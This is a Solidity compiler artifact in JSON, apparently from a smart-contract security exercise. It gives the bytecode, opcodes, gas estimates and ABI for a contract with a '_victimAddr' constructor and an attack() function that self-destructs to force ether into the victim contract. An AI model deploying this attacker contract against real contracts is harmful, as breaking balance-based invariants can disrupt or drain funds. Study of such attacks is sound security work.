{
	"data": {
		"bytecode": {
			"linkReferences": {},
			"object": "608060405234801561001057600080fd5b506040516102cf3803806102cf8339818101604052810190610032919061008d565b806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550506100ff565b600081519050610087816100e8565b92915050565b60006020828403121561009f57600080fd5b60006100ad84828501610078565b91505092915050565b60006100c1826100c8565b9050919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6100f1816100b6565b81146100fc57600080fd5b50565b6101c18061010e6000396000f3fe6080604052600436106100385760003560e01c8063325ec768146100445780639e5faafc14610062578063dfcc8ce11461006c5761003f565b3661003f57005b600080fd5b61004c610097565b6040516100599190610164565b60405180910390f35b61006a6100b3565b005b34801561007857600080fd5b506100816100f2565b60405161008e9190610164565b60405180910390f35b60008034116100a557600080fd5b600080471190508091505090565b60008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1690508073ffffffffffffffffffffffffffffffffffffffff16ff5b60003373ffffffffffffffffffffffffffffffffffffffff166108fc479081150290604051600060405180830381858888f1935050505015801561013a573d6000803e3d6000fd5b50600047141561014d5760019050610152565b600090505b90565b61015e8161017f565b82525050565b60006020820190506101796000830184610155565b92915050565b6000811515905091905056fea2646970667358221220c88c76f0decfe1290f930c2e93a51101ff243a22377d5baec3f14630f2312b5364736f6c63430008000033",
			"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD PUSH2 0x2CF CODESIZE SUB DUP1 PUSH2 0x2CF DUP4 CODECOPY DUP2 DUP2 ADD PUSH1 0x40 MSTORE DUP2 ADD SWAP1 PUSH2 0x32 SWAP2 SWAP1 PUSH2 0x8D JUMP JUMPDEST DUP1 PUSH1 0x0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP POP PUSH2 0xFF JUMP JUMPDEST PUSH1 0x0 DUP2 MLOAD SWAP1 POP PUSH2 0x87 DUP2 PUSH2 0xE8 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x9F JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 PUSH2 0xAD DUP5 DUP3 DUP6 ADD PUSH2 0x78 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0xC1 DUP3 PUSH2 0xC8 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0xF1 DUP2 PUSH2 0xB6 JUMP JUMPDEST DUP2 EQ PUSH2 0xFC JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH2 0x1C1 DUP1 PUSH2 0x10E PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x38 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x325EC768 EQ PUSH2 0x44 JUMPI DUP1 PUSH4 0x9E5FAAFC EQ PUSH2 0x62 JUMPI DUP1 PUSH4 0xDFCC8CE1 EQ PUSH2 0x6C JUMPI PUSH2 0x3F JUMP JUMPDEST CALLDATASIZE PUSH2 0x3F JUMPI STOP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x4C PUSH2 0x97 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x59 SWAP2 SWAP1 PUSH2 0x164 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x6A PUSH2 0xB3 JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x78 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x81 PUSH2 0xF2 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x8E SWAP2 SWAP1 PUSH2 0x164 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH1 0x0 DUP1 CALLVALUE GT PUSH2 0xA5 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 DUP1 SELFBALANCE GT SWAP1 POP DUP1 SWAP2 POP POP SWAP1 JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 POP DUP1 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SELFDESTRUCT JUMPDEST PUSH1 0x0 CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0x8FC SELFBALANCE SWAP1 DUP2 ISZERO MUL SWAP1 PUSH1 0x40 MLOAD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP9 CALL SWAP4 POP POP POP POP ISZERO DUP1 ISZERO PUSH2 0x13A JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP PUSH1 0x0 SELFBALANCE EQ ISZERO PUSH2 0x14D JUMPI PUSH1 0x1 SWAP1 POP PUSH2 0x152 JUMP JUMPDEST PUSH1 0x0 SWAP1 POP JUMPDEST SWAP1 JUMP JUMPDEST PUSH2 0x15E DUP2 PUSH2 0x17F JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x179 PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x155 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 ISZERO ISZERO SWAP1 POP SWAP2 SWAP1 POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0xC8 DUP13 PUSH23 0xF0DECFE1290F930C2E93A51101FF243A22377D5BAEC3F1 CHAINID ADDRESS CALLCODE BALANCE 0x2B MSTORE8 PUSH5 0x736F6C6343 STOP ADDMOD STOP STOP CALLER "
		},
		"gasEstimates": {
			"creation": {
				"codeDepositCost": "89800",
				"executionCost": "infinite",
				"totalCost": "infinite"
			},
			"external": {
				"attack()": "30967",
				"sendBalanceBack()": "infinite",
				"sendEtherToContract()": "340"
			}
		},
		"methodIdentifiers": {
			"attack()": "9e5faafc",
			"sendBalanceBack()": "dfcc8ce1",
			"sendEtherToContract()": "325ec768"
		}
	},
	"abi": [
		{
			"inputs": [
				{
					"internalType": "address",
					"name": "_victimAddr",
					"type": "address"
				}
			],
			"stateMutability": "nonpayable",
			"type": "constructor"
		},
		{
			"inputs": [],
			"name": "attack",
			"outputs": [],
			"stateMutability": "payable",
			"type": "function"
		},
		{
			"inputs": [],
			"name": "sendBalanceBack",
			"outputs": [
				{
					"internalType": "bool",
					"name": "",
					"type": "bool"
				}
			],
			"stateMutability": "nonpayable",
			"type": "function"
		},
		{
			"inputs": [],
			"name": "sendEtherToContract",
			"outputs": [
				{
					"internalType": "bool",
					"name": "",
					"type": "bool"
				}
			],
			"stateMutability": "payable",
			"type": "function"
		},
		{
			"stateMutability": "payable",
			"type": "receive"
		}
	]
}